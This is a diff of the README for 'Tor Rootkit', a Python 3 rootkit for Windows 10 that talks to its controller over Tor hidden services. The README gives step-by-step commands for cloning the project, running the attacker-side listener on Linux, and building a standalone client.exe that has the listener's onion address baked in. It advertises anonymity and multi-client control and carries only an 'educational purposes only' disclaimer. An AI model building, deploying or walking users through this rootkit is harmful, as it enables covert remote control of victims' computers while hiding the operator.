@@ -1,54 +1,65 @@
 # Tor Rootkit
-A python3 standalone Windows 10 Rootkit. The networking works over tor hidden services.
-The exe Rootkit-File contains the tor expert bundle, so no staged payload is needed.
+[![License: MIT](https://img.shields.io/badge/License-MIT-brightgreen.svg)]
 
-## Disclaimer
-USE FOR EDUCATIONAL PURPOSES ONLY
+A Python 3 standalone Windows 10 Rootkit. The networking works over tor hidden services.
+
 
 ## Installation
-First clone the git repository and change directory into the repo.
+- Clone with git:
+```bash
+git clone https://github.com/emcruise/TorRootkit.git
+```
+
+- Change directory to the repository:
+```bash
+cd ./TorRootkit
+```
 
 ### Listener
-Install all dependencies:
+The listener is designed to run on linux.
+
+#### Prerequisites
+- [Tor](https://www.torproject.org/)
+- [Python3](https://www.python.org/)
+- [Pip3](https://pypi.org/project/pip/)
+
+1. Install all pip3 dependencies:
 ```bash
 pip3 install -r listener/requirements.txt
 ```
 
-After that the listener can be run with:
+2. Run the listener:
 ```bash
-python3 listener/listener.py <listen-port> <forward-port>
-```
-Or:
-```bash
-./listener/listener.py <listen-port> <forward-port>
+./listener/listener.py <hiddenservice-port> <local-port>
 ```
 
 ### Client
-Note: The compilation of the Rootkit client ONLY works on Windows.
+The client is designed to run on Windows 10.
 
-Install all dependencies:
+#### Prerequisites
+- [Python3](https://www.python.org/)
+- [Pip3](https://pypi.org/project/pip/)
+
+1. Install all pip3 dependencies:
 ```bash
 pip3 install -r client\requirements.txt
 ```
-Once the dependencies are installed you can build the executable file:
-(Call build.py with the onion address and port of the listener.)
+2. Build executable from build.py:
+- downloads [Tor Expert Bundle](https://www.torproject.org/download/tor/)
+- bundles python3 interpreter and tor expert bundle into 1 standalone .exe file
 ```bash
-python client\build.py <onion> <port>
+python client\build.py <listener-onion-address> <listener-onion-port>
 ```
-The .exe file should now be at:
+
+3. Execute the bundled client:
 ```bash
 .\client\dist\client.exe
-```
-Tor run the client just execute client.exe:
-```bash
-.\client.exe
-```
-Or run the client with the python interpreter:
-```bash
-python client.py
 ```
 
 ## Features
 - Standalone executable, including python interpreter and tor expert bundle (~13MB)
 - the whole communication works over tor hidden services which guarantees some degree of anonymity
 - Listener can handle multiple clients
+
+## Disclaimer
+Use for educational purposes only.
